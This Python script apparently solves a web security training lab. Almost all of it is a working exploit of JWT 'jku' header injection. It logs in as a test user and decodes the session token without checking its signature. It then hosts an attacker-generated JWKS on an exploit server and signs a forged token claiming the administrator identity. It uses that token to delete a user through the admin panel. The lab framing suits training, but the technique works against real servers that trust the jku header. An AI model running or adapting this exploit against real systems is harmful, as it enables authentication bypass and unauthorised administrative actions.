import requests
import sys
import time
import json
import jwt
import urllib3
from jwcrypto import jwk
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# pip install jwcrypto pyjwt


def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    token = soup.find("input", {"name": "csrf"})
    if token:
        return token["value"]
    return None


def login(s, url, username, password):
    login_page = url + "/login"
    csrf = get_csrf_token(s, login_page)
    data = {"username": username, "password": password}
    if csrf:
        data["csrf"] = csrf
        r = s.post(login_page, data=data, verify=False, proxies=proxies, timeout=10)
        if f"Your username is: {username}" in r.text:
            return True
    return False


def get_exploit_host(s, url):
    # Every lab page has an "EXPLOIT SERVER" link in its nav bar pointing
    # at the actual per-session exploit server, which has its own
    # independent ID that doesn't match the lab's own subdomain.
    r = s.get(url + "/", verify=False, proxies=proxies, timeout=10)
    soup = BeautifulSoup(r.text, "html.parser")
    link = soup.find("a", attrs={"id": "exploit-link"})
    if not link:
        return None
    return link["href"].rstrip("/")


def host_jwks(exploit_host, jwks):
    body = json.dumps(jwks)
    head = "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n"

    data = {
        "urlIsHttps": "true",
        "responseFile": "/jwks.json",
        "responseHead": head,
        "responseBody": body,
        "formAction": "STORE",
    }
    r = requests.post(exploit_host + "/", data=data, verify=False, proxies=proxies, timeout=10)
    return r.status_code == 200


def forge_admin_cookie(s, exploit_host):
    cookie = s.cookies.get("session")
    if not cookie:
        return False

    payload = jwt.decode(cookie, options={"verify_signature": False})
    payload["sub"] = "administrator"

    rsa_key = jwk.JWK.generate(kty="RSA", size=2048)
    public_jwk = rsa_key.export_public(as_dict=True)
    private_pem = rsa_key.export_to_pem(private_key=True, password=None)

    # kid here just has to match the kid on the matching entry inside the
    # JWKS we're about to host, so the server picks the right key out of
    # the set once it fetches it.
    key_id = "evil-key"
    public_jwk["kid"] = key_id
    public_jwk["use"] = "sig"
    public_jwk["alg"] = "RS256"

    jwks = {"keys": [public_jwk]}
    if not host_jwks(exploit_host, jwks):
        return False

    header = {"jku": exploit_host + "/jwks.json", "kid": key_id}
    forged = jwt.encode(payload, private_pem, algorithm="RS256", headers=header)
    s.cookies.set("session", forged)
    return True


def delete_carlos(s, url):
    r = s.get(url + "/admin/delete?username=carlos", verify=False, allow_redirects=False, proxies=proxies, timeout=10)
    return r.status_code == 302


def check_solved(s, url, retries=5, delay=1.5):
    for attempt in range(retries):
        r = s.get(url + "/", verify=False, proxies=proxies, timeout=10)
        if 'Congratulations' in r.text:
            print("[+] Lab solved!")
            return True
        if attempt < retries - 1:
            time.sleep(delay)
    print("[-] Lab not solved yet")
    return False


def main():
    if len(sys.argv) != 2:
        print(f"[+] Usage: {sys.argv[0]} <URL>")
        sys.exit(0)

    s = requests.Session()
    url = sys.argv[1].strip().rstrip("/")

    exploit_host = get_exploit_host(s, url)
    if not exploit_host:
        print("[-] Could not find exploit server link on lab page")
        sys.exit(1)
    print(f"[+] Found exploit server: {exploit_host}")

    if not login(s, url, "wiener", "peter"):
        print("[-] Login failed")
        return False
    print("[+] Logged in as wiener")

    if not forge_admin_cookie(s, exploit_host):
        print("[-] Failed to forge admin cookie")
        return False
    print("[+] Hosted JWKS on exploit server and forged session cookie with jku header")

    if not delete_carlos(s, url):
        print("[-] Failed to delete carlos")
        return False
    print("[+] Deleted carlos")

    check_solved(s, url)


if __name__ == "__main__":
    main()